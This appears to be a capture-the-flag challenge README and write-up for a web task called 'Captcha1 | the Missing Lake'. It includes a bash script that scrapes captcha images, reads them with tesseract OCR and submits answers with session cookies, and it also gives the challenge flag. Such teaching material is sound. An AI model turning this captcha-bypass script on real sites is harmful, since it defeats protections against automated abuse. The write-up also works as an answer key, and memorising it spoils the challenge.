#### :warning: Please configure `processes` in Nginx Unit in Dockerfile according to server specs and [documentation](https://unit.nginx.org/configuration/#applications), right now it is not set, and the default value is 1, which is not optimal.


# Challenge Title/Description

Captcha1 | the Missing Lake

Our low-budget human captcha solvers have gone missing. We need you to help us crack our way into the city's old database, where did the lake go? We gotta find out!

You are going to help us in bypassing captchas.

> https://captcha1.uctf.ir

# Write Up

I tried to create the question as performant as possible(for obvious reasons), no I/O calls are involved(no PHP sessions and the image creating is done on memory).

- data is being stored in a Redis instance.
- image is created using the gd extension.
- the application is being served by Nginx Unit.

### How to Solve
1. Solve 300 captchas by hand. :)
2. Use tesseract + bash/python + a simple loop or parallel

#### Note: Due to challenge saving session via cookie, we have to do the following:
Add your Cookies which you have aquired from opening the page once to the `-H` in curl commands

for example:
```bash
#!/usr/bin/env bash

extract_image() {
    image_data=$(echo "$1" | grep -oP 'data:image/png;base64,[^"]*')
    image_base64=$(echo "$image_data" | cut -d ',' -f 2)
    echo "$image_base64"
}

submit_form() {
    curl -s -X POST \
        -H <Add your Cookies here> \
        -d "captcha=$1" \
        "https://captcha1.uctf.ir/" > /dev/null
}

website=$(curl -H <Add your cookies here> -s "https://captcha1.uctf.ir/")

image_base64=$(extract_image "$website")

if [ -n "$image_base64" ]; then
    echo "Extracted image from HTML."

    echo "$image_base64" | base64 -d > captcha_image.png

    recognized_text=$(tesseract captcha_image.png - -l eng)

    if [ -n "$recognized_text" ]; then
        echo "Recognized text: $recognized_text"

        submit_form "$recognized_text"

        echo "Form submitted."
    else
        echo "Text recognition failed."
    fi

    rm captcha_image.png
else
    echo "Image extraction failed."
fi
```

# Flag

UCTF_{7h3_m1551n6_l4k3}

# Categories

Check the categories which the challenge belongs to.

- [x] Web
- [ ] Reverse
- [ ] PWN
- [ ] Misc
- [ ] Forensics
- [ ] Cryptography
- [ ] Steganography

# Points

| Warm up | This Challenge  | Evil |
| ------- |:---------------:| ----:|
| 25      | 250 | 500  |

# Resources

You should create a folder including all needed files. You may create the challenge using [Docker Compose](https://docs.docker.com/compose/gettingstarted/). Additionally, You may put your files here including *reverse engineering* or *pcap* files.
